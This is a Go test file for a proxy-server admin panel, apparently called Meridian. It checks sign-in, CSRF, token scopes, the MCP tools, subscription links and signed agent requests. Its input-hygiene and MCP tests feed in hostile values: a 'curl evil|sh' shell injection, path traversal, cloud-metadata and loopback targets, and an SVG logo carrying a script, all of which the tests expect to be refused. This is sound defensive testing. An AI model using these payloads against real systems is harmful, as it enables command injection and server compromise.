package panel

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/http/httptest"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"testing"
	"time"

	"meridian/internal/db"
	"meridian/internal/proto"
	"meridian/internal/seal"
)

type harness struct {
	t     *testing.T
	p     *Panel
	srv   *httptest.Server
	agent string
}

func newHarness(t *testing.T) *harness {
	t.Helper()
	dir := t.TempDir()
	agentDir := filepath.Join(dir, "agent")
	if err := os.MkdirAll(agentDir, 0o755); err != nil {
		t.Fatal(err)
	}
	for _, arch := range []string{"amd64", "arm64"} {
		if err := os.WriteFile(filepath.Join(agentDir, "meridian-agent-linux-"+arch), []byte("fake agent "+arch), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	d, err := db.Open(filepath.Join(dir, "meridian.db"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { d.Close() })
	h, err := hashPassword("owner-password-1")
	if err != nil {
		t.Fatal(err)
	}
	if _, err := d.Exec1(`INSERT INTO accounts (username, display_name, role, password_hash, created_at)
		VALUES ('owner', 'Owner', 'owner', ?, ?)`, h, now()); err != nil {
		t.Fatal(err)
	}
	p, err := New(Config{DataDir: dir, AgentDir: agentDir}, d)
	if err != nil {
		t.Fatal(err)
	}
	ts := httptest.NewServer(p.Handler())
	t.Cleanup(ts.Close)
	return &harness{t: t, p: p, srv: ts, agent: agentDir}
}

// client is a browser-like client with a cookie jar.
type client struct {
	h     *harness
	http  *http.Client
	token string // API token instead of the session cookie
	csrf  bool
}

func (h *harness) browser() *client {
	jar, _ := cookiejar.New(nil)
	return &client{h: h, http: &http.Client{Jar: jar}, csrf: true}
}

func (h *harness) bearer(tok string) *client {
	return &client{h: h, http: &http.Client{}, token: tok}
}

func (c *client) do(method, path string, body any) (int, map[string]any, []byte) {
	c.h.t.Helper()
	var rd io.Reader
	if body != nil {
		b, _ := json.Marshal(body)
		rd = bytes.NewReader(b)
	}
	req, _ := http.NewRequest(method, c.h.srv.URL+path, rd)
	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}
	if c.csrf {
		req.Header.Set("X-Meridian", "1")
	}
	if c.token != "" {
		req.Header.Set("Authorization", "Bearer "+c.token)
	}
	resp, err := c.http.Do(req)
	if err != nil {
		c.h.t.Fatal(err)
	}
	defer resp.Body.Close()
	raw, _ := io.ReadAll(resp.Body)
	var m map[string]any
	_ = json.Unmarshal(raw, &m)
	return resp.StatusCode, m, raw
}

func (c *client) must(method, path string, body any, want int) map[string]any {
	c.h.t.Helper()
	code, m, raw := c.do(method, path, body)
	if code != want {
		c.h.t.Fatalf("%s %s: status %d, want %d: %s", method, path, code, want, raw)
	}
	return m
}

func (c *client) login(user, pw string) {
	c.h.t.Helper()
	c.must("POST", "/api/login", map[string]string{"username": user, "password": pw}, 200)
}

func id(v any) int64 {
	f, _ := v.(float64)
	return int64(f)
}

// ---------------------------------------------------------------- session & CSRF

func TestLoginAndCSRF(t *testing.T) {
	h := newHarness(t)
	b := h.browser()
	b.csrf = false
	if code, _, _ := b.do("POST", "/api/login", map[string]string{"username": "owner", "password": "owner-password-1"}); code != 403 {
		t.Fatalf("login without the CSRF header: %d", code)
	}
	b.csrf = true
	if code, _, _ := b.do("POST", "/api/login", map[string]string{"username": "owner", "password": "wrong-password"}); code != 401 {
		t.Fatalf("wrong password: %d", code)
	}
	b.login("owner", "owner-password-1")
	b.must("GET", "/api/me", nil, 200)
	b.csrf = false
	if code, _, _ := b.do("POST", "/api/users", map[string]string{"name": "x"}); code != 403 {
		t.Fatalf("cookie POST without CSRF header: %d", code)
	}
	b.csrf = true
	b.must("POST", "/api/users", map[string]string{"name": "x"}, 201)
	b.must("POST", "/api/logout", nil, 200)
	if code, _, _ := b.do("GET", "/api/me", nil); code != 401 {
		t.Fatalf("after logout: %d", code)
	}
}

func TestMetaRevealsLittleToStrangers(t *testing.T) {
	h := newHarness(t)
	_, m, _ := h.browser().do("GET", "/api/meta", nil)
	// a stranger learns what the sign-in page shows - the name, its line of text and how the logo
	// looks - and nothing else
	logo, _ := m["logo"].(map[string]any)
	if len(m) != 3 || m["site_title"] == nil || m["about"] == nil || logo == nil {
		t.Fatalf("anonymous meta: %v", m)
	}
	for k := range logo {
		if k != "custom" && k != "v" && k != "animation" {
			t.Errorf("anonymous meta tells %q about the logo", k)
		}
	}
	b := h.browser()
	b.login("owner", "owner-password-1")
	m = b.must("GET", "/api/meta", nil, 200)
	if m["version"] == nil || m["kinds"] == nil {
		t.Fatalf("signed-in meta: %v", m)
	}
}

func TestLoginRateLimit(t *testing.T) {
	h := newHarness(t)
	b := h.browser()
	limited := false
	for i := 0; i < 15; i++ {
		code, _, _ := b.do("POST", "/api/login", map[string]string{"username": "owner", "password": "nope"})
		if code == 429 {
			limited = true
			break
		}
	}
	if !limited {
		t.Fatal("15 wrong passwords in a row were never rate limited")
	}
}

// ---------------------------------------------------------------- users and their own page

func TestUsersSeeOnlyTheirOwn(t *testing.T) {
	h := newHarness(t)
	owner := h.browser()
	owner.login("owner", "owner-password-1")
	owner.must("POST", "/api/servers", map[string]any{"name": "Tokyo", "address": "203.0.113.1", "protocols": []string{"vless"}}, 201)
	var made []map[string]any
	_, _, raw := owner.do("POST", "/api/users", map[string]any{"name": "Alice Example", "quota": 10 << 30})
	_ = json.Unmarshal(raw, &made)
	if len(made) != 1 || made[0]["username"] != "alice-example" || made[0]["password"] == nil || made[0]["can_sign_in"] != true {
		t.Fatalf("created user: %s", raw)
	}
	alicePW := made[0]["password"].(string)
	aliceID := strconv.FormatInt(id(made[0]["id"]), 10)
	owner.must("POST", "/api/users", map[string]any{"name": "Bob", "username": "bob", "password": "bob-password-12"}, 201)
	// listing never shows a password again
	_, _, raw = owner.do("GET", "/api/users/"+aliceID, nil)
	if strings.Contains(string(raw), alicePW) || strings.Contains(string(raw), "password_hash") {
		t.Fatal("a user's password or hash is shown after creation")
	}
	if code, _, _ := owner.do("POST", "/api/users", map[string]any{"name": "x", "username": "owner"}); code != 409 {
		t.Errorf("a user took the supervisor's name: %d", code)
	}
	if code, _, _ := owner.do("POST", "/api/users", map[string]any{"name": "x", "username": "bob"}); code != 409 {
		t.Errorf("duplicate username: %d", code)
	}

	alice := h.browser()
	_, m, _ := alice.do("POST", "/api/login", map[string]string{"username": "alice-example", "password": alicePW})
	if m["kind"] != "user" {
		t.Fatalf("user sign-in: %v", m)
	}
	me := alice.must("GET", "/api/portal/me", nil, 200)
	if me["name"] != "Alice Example" || me["link"] == nil || len(me["servers"].([]any)) != 1 || len(me["days"].([]any)) != 30 {
		t.Fatalf("portal: %v", me)
	}
	// a user's session reaches nothing of the admin API
	for _, c := range []struct{ method, path string }{
		{"GET", "/api/me"}, {"GET", "/api/servers"}, {"GET", "/api/users"}, {"GET", "/api/users/" + aliceID},
		{"POST", "/api/users"}, {"GET", "/api/settings"}, {"GET", "/api/ips"}, {"GET", "/api/live"}, {"POST", "/api/blocks"},
		{"GET", "/api/tokens"}, {"POST", "/api/tokens"}, {"GET", "/api/protocols"},
	} {
		if code, _, _ := alice.do(c.method, c.path, map[string]any{}); code != 401 {
			t.Errorf("user session reached %s %s: %d", c.method, c.path, code)
		}
	}
	// the supervisor's session is not a user session
	if code, _, _ := owner.do("GET", "/api/portal/me", nil); code != 401 {
		t.Errorf("admin session on the user page: %d", code)
	}
	// password change: wrong current refused, right one works, old password stops working
	if code, _, _ := alice.do("POST", "/api/portal/password", map[string]string{"current": "nope", "new": "alice-new-password"}); code != 400 {
		t.Errorf("wrong current password: %d", code)
	}
	alice.must("POST", "/api/portal/password", map[string]string{"current": alicePW, "new": "alice-new-password"}, 200)
	if code, _, _ := h.browser().do("POST", "/api/login", map[string]string{"username": "alice-example", "password": alicePW}); code != 401 {
		t.Errorf("old password still works: %d", code)
	}
	// the supervisor resets the password: every session of the user ends
	owner.must("PATCH", "/api/users/"+aliceID, map[string]any{"password": "set-by-admin-123"}, 200)
	if code, _, _ := alice.do("GET", "/api/portal/me", nil); code != 401 {
		t.Errorf("session survived a password reset: %d", code)
	}
	// removing the username removes the sign-in
	owner.must("PATCH", "/api/users/"+aliceID, map[string]any{"username": ""}, 200)
	if code, _, _ := h.browser().do("POST", "/api/login", map[string]string{"username": "alice-example", "password": "set-by-admin-123"}); code != 401 {
		t.Errorf("sign-in without a username: %d", code)
	}
	// several at once get their own names and passwords
	var batch []map[string]any
	_, _, raw = owner.do("POST", "/api/users", map[string]any{"name": "Team", "count": 3})
	_ = json.Unmarshal(raw, &batch)
	if len(batch) != 3 || batch[0]["username"] != "team-1" || batch[2]["username"] != "team-3" || batch[1]["password"] == batch[2]["password"] {
		t.Fatalf("batch: %s", raw)
	}
}

func TestOneSupervisor(t *testing.T) {
	h := newHarness(t)
	b := h.browser()
	b.login("owner", "owner-password-1")
	for _, path := range []string{"/api/accounts", "/api/accounts/1"} {
		if code, _, _ := b.do("GET", path, nil); code == 200 {
			t.Errorf("%s still exists", path)
		}
	}
}

// ---------------------------------------------------------------- input hygiene

func TestHostileInputIsRefusedOrCleaned(t *testing.T) {
	h := newHarness(t)
	b := h.browser()
	b.login("owner", "owner-password-1")
	if code, _, _ := b.do("POST", "/api/servers", map[string]any{"name": "x", "address": "evil.com\nmalicious"}); code != 400 {
		t.Errorf("address with a line break: %d", code)
	}
	s := b.must("POST", "/api/servers", map[string]any{"name": "Box\nPostUp = id", "address": "203.0.113.9"}, 201)
	if name := s["server"].(map[string]any)["name"]; name != "Box PostUp = id" {
		t.Errorf("name not cleaned: %q", name)
	}
	sid := strconv.FormatInt(id(s["server"].(map[string]any)["id"]), 10)
	for _, settings := range []map[string]any{
		{"security": "reality", "target": "127.0.0.1:22"},                   // a stranger would reach the server's SSH
		{"security": "reality", "own_site": true, "target": "127.0.0.1:22"}, // not a website
		{"security": "reality", "own_site": true, "target": "10.0.0.5:443"}, // own site must be on loopback
		{"security": "reality", "target": "169.254.169.254:80"},             // cloud metadata
		{"security": "reality", "sni": "localhost"},                         // not a public name
		{"security": "none"},                       // VLESS without encryption
		{"security": "reality", "transport": "ws"}, // REALITY cannot run over WebSocket
		{"security": "tls", "cert_mode": "custom", "cert_pem": "x", "key_pem": "y"}, // not a certificate
		{"transport": "ws", "path": "/a b\nc", "security": "tls"},                   // a path with spaces and a line break
		{"security": "tls", "flow": "xtls-rprx-vision", "transport": "grpc"},        // Vision only over raw
	} {
		if code, _, raw := b.do("POST", "/api/servers/"+sid+"/nodes", map[string]any{"kind": "vless", "settings": settings}); code != 400 {
			t.Errorf("VLESS %v: %d %s", settings, code, raw)
		}
	}
	for kind, settings := range map[string]map[string]any{
		"trojan":      {"security": "none"},
		"shadowsocks": {"transport": "ws"},
		"socks":       {"security": "tls"},
		"vmess":       {"security": "reality"},
		"hysteria2":   {"transport": "ws"},
		"wireguard":   {"security": "tls"},
	} {
		if code, _, raw := b.do("POST", "/api/servers/"+sid+"/nodes", map[string]any{"kind": kind, "settings": settings}); code != 400 {
			t.Errorf("%s %v: %d %s", kind, settings, code, raw)
		}
	}
	if code, _, _ := b.do("POST", "/api/servers/"+sid+"/forwards", map[string]any{"target": "169.254.169.254:80", "engine": "realm"}); code != 400 {
		t.Errorf("forward to cloud metadata: %d", code)
	}
	if code, _, _ := b.do("PUT", "/api/settings", map[string]any{"public_url": "https://x.com\"; curl evil|sh; \""}); code != 400 {
		t.Errorf("public URL with shell characters: %d", code)
	}
	if code, _, _ := b.do("PUT", "/api/settings", map[string]any{"xray_version": "../../../etc"}); code != 400 {
		t.Errorf("version with a path: %d", code)
	}
	if code, _, _ := b.do("POST", "/api/blocks", map[string]any{"ip": "0.0.0.0/0"}); code != 400 {
		t.Errorf("blocking the whole internet: %d", code)
	}
}

// ---------------------------------------------------------------- API tokens

func TestTokenScopes(t *testing.T) {
	h := newHarness(t)
	b := h.browser()
	b.login("owner", "owner-password-1")
	read := b.must("POST", "/api/tokens", map[string]any{"name": "ro", "scope": "read"}, 201)["token"].(string)
	full := b.must("POST", "/api/tokens", map[string]any{"name": "rw", "scope": "full", "days": 30}, 201)
	fullTok := full["token"].(string)

	r := h.bearer(read)
	r.must("GET", "/api/servers", nil, 200)
	if code, _, _ := r.do("POST", "/api/users", map[string]any{"name": "x"}); code != 403 {
		t.Errorf("read token wrote: %d", code)
	}
	w := h.bearer(fullTok)
	srv := w.must("POST", "/api/servers", map[string]any{"name": "via token", "address": "203.0.113.3"}, 201)
	if srv["install"] == nil {
		t.Error("full token should see the install command")
	}
	sid := strconv.FormatInt(id(srv["server"].(map[string]any)["id"]), 10)
	if m := r.must("GET", "/api/servers/"+sid, nil, 200); m["install"] != nil {
		t.Error("a read-only token must not see the agent token")
	}
	for _, c := range []struct{ method, path string }{
		{"GET", "/api/tokens"}, {"POST", "/api/tokens"}, {"POST", "/api/me/password"}, {"POST", "/api/me/totp/setup"},
		{"GET", "/api/me/sessions"},
	} {
		if code, _, _ := w.do(c.method, c.path, map[string]any{}); code != 403 {
			t.Errorf("token reached session-only %s %s: %d", c.method, c.path, code)
		}
	}
	// revoke
	b.must("DELETE", "/api/tokens/"+strconv.FormatInt(id(full["id"]), 10), nil, 200)
	if code, _, _ := w.do("GET", "/api/servers", nil); code != 401 {
		t.Errorf("revoked token still works: %d", code)
	}
	if code, _, _ := h.bearer("mrd_"+strings.Repeat("a", 48)).do("GET", "/api/servers", nil); code != 401 {
		t.Errorf("made-up token: %d", code)
	}
	// a bearer request never falls back to the session cookie
	b.token = "garbage"
	if code, _, _ := b.do("GET", "/api/servers", nil); code != 401 {
		t.Errorf("bad bearer with a valid cookie: %d", code)
	}
}

// ---------------------------------------------------------------- MCP

func TestMCP(t *testing.T) {
	h := newHarness(t)
	b := h.browser()
	b.login("owner", "owner-password-1")
	read := b.must("POST", "/api/tokens", map[string]any{"name": "ro", "scope": "read"}, 201)["token"].(string)
	full := b.must("POST", "/api/tokens", map[string]any{"name": "rw", "scope": "full"}, 201)["token"].(string)

	call := func(tok string, body string) map[string]any {
		req, _ := http.NewRequest("POST", h.srv.URL+"/mcp", strings.NewReader(body))
		req.Header.Set("Authorization", "Bearer "+tok)
		req.Header.Set("Content-Type", "application/json")
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatal(err)
		}
		defer resp.Body.Close()
		var m map[string]any
		_ = json.NewDecoder(resp.Body).Decode(&m)
		return m
	}
	init := call(read, `{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18"}}`)
	if init["result"].(map[string]any)["protocolVersion"] != "2025-06-18" {
		t.Fatalf("initialize: %v", init)
	}
	count := func(tok string) int {
		res := call(tok, `{"jsonrpc":"2.0","id":2,"method":"tools/list"}`)
		return len(res["result"].(map[string]any)["tools"].([]any))
	}
	if r, f := count(read), count(full); r >= f || r == 0 {
		t.Fatalf("read token sees %d tools, full token %d", r, f)
	}
	text := func(res map[string]any) (string, bool) {
		r := res["result"].(map[string]any)
		return r["content"].([]any)[0].(map[string]any)["text"].(string), r["isError"].(bool)
	}
	out, isErr := text(call(full, `{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"create_user","arguments":{"name":"bob","ip_limit":2}}}`))
	if isErr || !strings.Contains(out, "bob") || !strings.Contains(out, "password") {
		t.Fatalf("create_user: %s", out)
	}
	var created []map[string]any
	_ = json.Unmarshal([]byte(out), &created)
	sid := strconv.FormatInt(id(created[0]["id"]), 10)
	if _, isErr := text(call(full, `{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"pause_user","arguments":{"user_id":`+sid+`}}}`)); !isErr {
		t.Fatal("pause without confirm went through")
	}
	if _, isErr := text(call(read, `{"jsonrpc":"2.0","id":5,"method":"tools/call","params":{"name":"pause_user","arguments":{"user_id":`+sid+`,"confirm":true}}}`)); !isErr {
		t.Fatal("read token paused a user")
	}
	out, isErr = text(call(full, `{"jsonrpc":"2.0","id":6,"method":"tools/call","params":{"name":"pause_user","arguments":{"user_id":`+sid+`,"confirm":true}}}`))
	if isErr || !strings.Contains(out, "paused") {
		t.Fatalf("confirmed pause: %s", out)
	}
	// a new sign-in password comes back once, with where to sign in
	out, isErr = text(call(full, `{"jsonrpc":"2.0","id":7,"method":"tools/call","params":{"name":"new_user_password","arguments":{"user_id":`+sid+`}}}`))
	if isErr || !strings.Contains(out, "password") || !strings.Contains(out, "/me") {
		t.Fatalf("new_user_password: %s", out)
	}
	// the status page: on at /status with the panel in Hong Kong; an unknown city is refused
	out, isErr = text(call(full, `{"jsonrpc":"2.0","id":8,"method":"tools/call","params":{"name":"set_status_page","arguments":{"mode":"page","panel_city":"Hong Kong"}}}`))
	if isErr || !strings.Contains(out, `"status_page":"page"`) || !strings.Contains(out, "Hong Kong") {
		t.Fatalf("set_status_page: %s", out)
	}
	if _, isErr := text(call(full, `{"jsonrpc":"2.0","id":9,"method":"tools/call","params":{"name":"set_status_page","arguments":{"panel_city":"Atlantis"}}}`)); !isErr {
		t.Fatal("an unknown city was accepted")
	}
	// name, logo and animation; a hostile logo is refused with the reason
	out, isErr = text(call(full, `{"jsonrpc":"2.0","id":10,"method":"tools/call","params":{"name":"set_branding","arguments":{"name":"Acme Net","animation":"pulse","logo_svg":"<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8 8'><circle cx='4' cy='4' r='3'/></svg>"}}}`))
	if isErr || !strings.Contains(out, `"name":"Acme Net"`) || !strings.Contains(out, `"custom":true`) || !strings.Contains(out, `"animation":"pulse"`) {
		t.Fatalf("set_branding: %s", out)
	}
	out, isErr = text(call(full, `{"jsonrpc":"2.0","id":11,"method":"tools/call","params":{"name":"set_branding","arguments":{"logo_svg":"<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script><rect width='1' height='1'/></svg>"}}}`))
	if !isErr || !strings.Contains(out, "script") {
		t.Fatalf("hostile logo over MCP: %v %s", isErr, out)
	}
	if out, isErr = text(call(full, `{"jsonrpc":"2.0","id":12,"method":"tools/call","params":{"name":"set_branding","arguments":{"reset_logo":true}}}`)); isErr || !strings.Contains(out, `"custom":false`) {
		t.Fatalf("reset_logo: %s", out)
	}
	// the dashboard's data is the supervisor's alone
	if code, _, _ := b.do("GET", "/api/status", nil); code != 200 {
		t.Fatalf("supervisor's dashboard data: %d", code)
	}
	if code, _, _ := h.browser().do("GET", "/api/status", nil); code != 401 {
		t.Fatalf("a stranger got the dashboard data: %d", code)
	}
	// origin check (DNS rebinding)
	req, _ := http.NewRequest("POST", h.srv.URL+"/mcp", strings.NewReader(`{"jsonrpc":"2.0","id":1,"method":"ping"}`))
	req.Header.Set("Authorization", "Bearer "+read)
	req.Header.Set("Origin", "https://evil.example")
	resp, _ := http.DefaultClient.Do(req)
	resp.Body.Close()
	if resp.StatusCode != 403 {
		t.Fatalf("foreign origin: %d", resp.StatusCode)
	}
}

// ---------------------------------------------------------------- docs

func TestOpenAPIDocumentsEveryRoute(t *testing.T) {
	h := newHarness(t)
	documented := map[string]bool{}
	for _, op := range apiOps {
		documented[op.Method+" "+op.Path] = true
	}
	skip := regexp.MustCompile(`^(GET /healthz|\w+ /agent/|GET /mcp|DELETE /mcp)`)
	for _, r := range h.p.routes {
		if skip.MatchString(r) {
			continue
		}
		if !documented[r] {
			t.Errorf("route %q is not in the API documentation (apidoc.go)", r)
		}
	}
	registered := map[string]bool{}
	for _, r := range h.p.routes {
		registered[r] = true
	}
	for k := range documented {
		if !registered[k] {
			t.Errorf("documented operation %q has no route", k)
		}
	}
	var doc map[string]any
	if err := json.Unmarshal(OpenAPIJSON(), &doc); err != nil || doc["openapi"] != "3.1.0" {
		t.Fatalf("invalid document: %v", err)
	}
}

// ---------------------------------------------------------------- subscriptions

func TestSubscriptionLink(t *testing.T) {
	h := newHarness(t)
	b := h.browser()
	b.login("owner", "owner-password-1")
	srv := b.must("POST", "/api/servers", map[string]any{"name": "Tokyo", "address": "203.0.113.4", "protocols": []string{"vless", "shadowsocks"}}, 201)
	_ = srv
	var subs []map[string]any
	_, _, raw := b.do("POST", "/api/users", map[string]any{"name": "carol"})
	_ = json.Unmarshal(raw, &subs)
	link := subs[0]["link"].(string)
	path := link[strings.Index(link, "/s/"):]

	get := func(p, ua string) (int, string, http.Header) {
		req, _ := http.NewRequest("GET", h.srv.URL+p, nil)
		req.Header.Set("User-Agent", ua)
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatal(err)
		}
		defer resp.Body.Close()
		body, _ := io.ReadAll(resp.Body)
		return resp.StatusCode, string(body), resp.Header
	}
	code, body, hdr := get(path, "mihomo/1.19")
	if code != 200 || !strings.Contains(body, "proxies:") || hdr.Get("Subscription-Userinfo") == "" {
		t.Fatalf("clash: %d %s", code, body)
	}
	code, body, hdr = get(path+"?client=html", "Mozilla/5.0")
	if code != 200 || !strings.Contains(hdr.Get("Content-Security-Policy"), "nonce-") || !strings.Contains(body, "carol") {
		t.Fatalf("page: %d %v", code, hdr)
	}
	if code, _, _ := get("/s/not-a-real-token-at-all", "mihomo"); code != 404 {
		t.Fatalf("unknown token: %d", code)
	}
	b.must("POST", "/api/users/"+strconv.FormatInt(id(subs[0]["id"]), 10)+"/pause", nil, 200)
	if code, _, _ := get(path, "mihomo/1.19"); code != 403 {
		t.Fatalf("paused subscription served: %d", code)
	}
}

// ---------------------------------------------------------------- agent channel

func TestInstallCommandPinsTheScript(t *testing.T) {
	h := newHarness(t)
	b := h.browser()
	b.login("owner", "owner-password-1")
	b.must("PUT", "/api/settings", map[string]any{"public_url": h.srv.URL}, 200)
	srv := b.must("POST", "/api/servers", map[string]any{"name": "x"}, 201)
	cmd := srv["install"].(string)
	m := regexp.MustCompile(`echo '([0-9a-f]{64})  meridian-install.sh'`).FindStringSubmatch(cmd)
	if m == nil {
		t.Fatalf("no pinned checksum in %q", cmd)
	}
	resp, err := http.Get(h.srv.URL + "/agent/install.sh")
	if err != nil {
		t.Fatal(err)
	}
	script, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	sum := sha256.Sum256(script)
	if hex.EncodeToString(sum[:]) != m[1] {
		t.Fatal("the pinned checksum does not match the served script")
	}
	agentSum := sha256.Sum256([]byte("fake agent amd64"))
	if !bytes.Contains(script, []byte(hex.EncodeToString(agentSum[:]))) {
		t.Fatal("the script does not pin the agent binary")
	}
}

func agentRequest(t *testing.T, h *harness, keys *seal.Keys, serverID int64, method, path string, ts int64, nonce string) *http.Response {
	t.Helper()
	req, _ := http.NewRequest(method, h.srv.URL+path, nil)
	req.Header.Set(seal.HeaderServer, strconv.FormatInt(serverID, 10))
	req.Header.Set(seal.HeaderTime, strconv.FormatInt(ts, 10))
	req.Header.Set(seal.HeaderNonce, nonce)
	req.Header.Set(seal.HeaderSign, keys.Sign(method, path, ts, nonce, nil))
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	return resp
}

func TestAgentChannel(t *testing.T) {
	h := newHarness(t)
	b := h.browser()
	b.login("owner", "owner-password-1")
	srv := b.must("POST", "/api/servers", map[string]any{"name": "x", "address": "203.0.113.5", "protocols": []string{"vless"}}, 201)
	tok := regexp.MustCompile(`--token '([^']+)'`).FindStringSubmatch(srv["install"].(string))[1]
	sid, secret, err := seal.ParseToken(tok)
	if err != nil {
		t.Fatal(err)
	}
	keys, _ := seal.Derive(secret)
	path := "/agent/v1/state?rev=&wait=0"
	nonce := seal.Nonce()
	resp := agentRequest(t, h, keys, sid, "GET", path, time.Now().Unix(), nonce)
	box, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	if resp.StatusCode != 200 {
		t.Fatalf("state: %d %s", resp.StatusCode, box)
	}
	plain, err := keys.Open(seal.ReplyContext(path, nonce), box)
	if err != nil {
		t.Fatalf("cannot open the state: %v", err)
	}
	var st proto.State
	if err := json.Unmarshal(plain, &st); err != nil || st.ServerID != sid || st.Contract != proto.Version {
		t.Fatalf("state: %v %+v", err, st)
	}
	if _, err := keys.Open(path, box); err == nil {
		t.Fatal("the answer is not bound to the request nonce")
	}
	// the same nonce again is a replay
	resp = agentRequest(t, h, keys, sid, "GET", path, time.Now().Unix(), nonce)
	resp.Body.Close()
	if resp.StatusCode != 401 {
		t.Fatalf("replayed request: %d", resp.StatusCode)
	}
	// a stale timestamp
	resp = agentRequest(t, h, keys, sid, "GET", path, time.Now().Unix()-3600, seal.Nonce())
	resp.Body.Close()
	if resp.StatusCode != 401 {
		t.Fatalf("hour-old request: %d", resp.StatusCode)
	}
	// someone else's key
	other, _ := seal.Derive(seal.NewSecret())
	resp = agentRequest(t, h, other, sid, "GET", path, time.Now().Unix(), seal.Nonce())
	resp.Body.Close()
	if resp.StatusCode != 401 {
		t.Fatalf("forged signature: %d", resp.StatusCode)
	}
	// an upgrade action carries the binary checksums inside the signed state
	b.must("POST", "/api/servers/"+strconv.FormatInt(sid, 10)+"/actions", map[string]any{"kind": "upgrade_agent"}, 202)
	if err := h.p.recompile(context.Background(), sid); err != nil { // the compile loop is not running in tests
		t.Fatal(err)
	}
	nonce = seal.Nonce()
	resp = agentRequest(t, h, keys, sid, "GET", path, time.Now().Unix(), nonce)
	box, _ = io.ReadAll(resp.Body)
	resp.Body.Close()
	plain, err = keys.Open(seal.ReplyContext(path, nonce), box)
	if err != nil {
		t.Fatal(err)
	}
	_ = json.Unmarshal(plain, &st)
	found := false
	for _, a := range st.Actions {
		if a.Kind == proto.ActionUpgradeAgent && strings.Contains(string(a.Args), "sha256") {
			found = true
		}
	}
	if !found {
		t.Fatalf("upgrade action without checksums: %+v", st.Actions)
	}
}
